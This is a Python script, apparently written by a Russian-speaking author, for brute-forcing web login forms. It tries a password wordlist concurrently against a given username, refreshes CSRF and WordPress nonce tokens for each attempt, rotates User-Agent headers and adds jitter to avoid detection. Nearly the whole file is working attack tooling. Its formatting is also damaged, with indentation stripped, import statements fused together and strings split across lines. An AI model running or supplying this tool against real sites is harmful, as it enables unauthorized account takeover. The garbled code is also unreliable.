#!/usr/bin/env python3
importimportimportimportimportimportimportasyncio
aiohttp
argparse
sys
re
time
random
from bs4 import BeautifulSoup
import warnings
warnings.filterwarnings("ignore")
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# Ротация User-Agent
USER_AGENTS = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
"(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101
Firefox/121.0",
]
# Признаки неудачного входа
FAILURE_INDICATORS = [
"invalid password", "incorrect password", "wrong password",
"login failed", "неверный пароль", "ошибка входа",
"invalid credentials", "authentication failed",
"bad credentials", "login error",
]
# Признаки успешного входа
SUCCESS_INDICATORS = [
"dashboard", "logout", "profile", "account", "welcome",
"выйти", "личный кабинет", "успешно",
]
found_password = None
attempts
 = 0
start_time = time.time()
async def get_csrf_token(session: aiohttp.ClientSession,
url: str) -> tuple[str | None, str | None]:
try:
async with session.get(url, ssl=False) as resp:
html = await resp.text()
soup = BeautifulSoup(html, "html.parser")
# Ищем hidden поля (CSRF токен обычно там)
for inp in soup.find_all("input", type="hidden"):
name = inp.get("name", "")
value = inp.get("value", "")
if any(k in name.lower() for k in ["csrf", "token", "_token",
"authenticity", "nonce"]):
return (name, value)
# WordPress wp_nonce
m = re.search(r'"nonce":"([^"]+)"', html)
if m:
return ("_wpnonce", m.group(1))
except Exception:
pass
return (None, None)
def detect_success(response_status: int, response_text: str,
response_url: str, original_url: str) -> bool:
"""Определяем успешный вход по разным критериям."""
if str(response_url) != original_url and response_status in (200, 302):
redirect_url = str(response_url)
if any(kw in redirect_url for kw in ["dashboard", "admin", "panel",
"home", "profile", "account"]):
return True
text_lower = response_text.lower()
if any(ind in text_lower for ind in SUCCESS_INDICATORS):
# Но убеждаемся что нет признаков неудачи
if not any(fail in text_lower for fail in FAILURE_INDICATORS):
return True
return False
async def try_login(session: aiohttp.ClientSession, url: str,
username: str, password: str,
user_field: str, pass_field: str,
extra_fields: dict,
semaphore: asyncio.Semaphore,
delay: float) -> tuple[bool, str]:
global attempts, found_password
async with semaphore:
if found_password:
return (False, password) # Уже нашли
if delay > 0:
await asyncio.sleep(delay + random.uniform(0, delay * 0.5))
# Получаем свежий CSRF токен для каждого запроса
csrf_name, csrf_value = await get_csrf_token(session, url)
data = {
user_field: username,
pass_field: password,
}
data.update(extra_fields)
if csrf_name and csrf_value:
data[csrf_name] = csrf_value
headers = {
"User-Agent": random.choice(USER_AGENTS),
"Referer": url,
}
try:
async with session.post(
url, data=data, headers=headers,
ssl=False, allow_redirects=True,
timeout=aiohttp.ClientTimeout(total=10)
) as resp:
text = await resp.text()
attempts += 1
if detect_success(resp.status, text, str(resp.url), url):
found_password = password
return (True, password)
except Exception:
pass
return (False, password)
async def run_bruteforce(url: str, username: str, wordlist_path: str,
user_field: str, pass_field: str,
extra_fields: dict, concurrency: int,
delay: float) -> None:
global found_password, attempts
# Читаем словарь
try:
with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
print(f"{RED}[!] Словарь не найден: {wordlist_path}{RESET}")
return
print(f"{CYAN}[*] Цель:
 {url}{RESET}")
print(f"{CYAN}[*] Логин: {username}{RESET}")
print(f"{CYAN}[*] Словарь: {len(passwords)} паролей{RESET}")
print(f"{CYAN}[*] Параллельно: {concurrency}{RESET}")
print("-" * 50)
semaphore = asyncio.Semaphore(concurrency)
connector = aiohttp.TCPConnector(ssl=False, limit=concurrency)
async with aiohttp.ClientSession(connector=connector) as session:
tasks = [
try_login(session, url, username, pwd,
user_field, pass_field, extra_fields,
semaphore, delay)
for pwd in passwords
]
completed = 0
for coro in asyncio.as_completed(tasks):
success, password = await coro
completed += 1
if completed % 50 == 0:
elapsed = time.time() - start_time
speed = attempts / elapsed if elapsed > 0 else 0
print(f"\r{CYAN}[*] Проверено: {completed}/{len(passwords)} | "
f"Скорость: {speed:.0f} req/s{RESET}", end="")
if success:
print(f"\n\n{GREEN}{'='*50}{RESET}")
print(f"{GREEN}[✓] ПАРОЛЬ НАЙДЕН!{RESET}")
print(f"{GREEN} Логин: {username}{RESET}")
print(f"{GREEN} Пароль: {password}{RESET}")
print(f"{GREEN}{'='*50}{RESET}")
return
elapsed = time.time() - start_time
print(f"\n\n{RED}[-] Пароль не найден в словаре ({len(passwords)} паролей, "
f"{elapsed:.1f}s){RESET}")
def main():
parser = argparse.ArgumentParser(description="Async HTTP Bruteforce")
parser.add_argument("-u", "--url",
 required=True, help="URL формы
входа")
parser.add_argument("--username",
 required=True, help="Имя
пользователя")
parser.add_argument("--wordlist",
 required=True, help="Путь к словарю
паролей")
parser.add_argument("--user-field",
 default="username",
help="Имя поля логина (default: username)")
parser.add_argument("--pass-field",
 default="password",
help="Имя поля пароля (default: password)")
parser.add_argument("-c", "--concurrency", type=int, default=20,
help="Кол-во параллельных запросов")
parser.add_argument("--delay",
 type=float, default=0.0,
help="Задержка между запросами (сек)")
parser.add_argument("--extra",
 default=None,
help="Дополнительные поля формы: 'field1=val1,field2=val2'")
args = parser.parse_args()
extra_fields = {}
if args.extra:
for pair in args.extra.split(","):
if "=" in pair:
k, v = pair.split("=", 1)
extra_fields[k] = v
asyncio.run(run_bruteforce(
args.url, args.username, args.wordlist,
args.user_field, args.pass_field, extra_fields,
args.concurrency, args.delay
))
if __name__ == "__main__":
main()
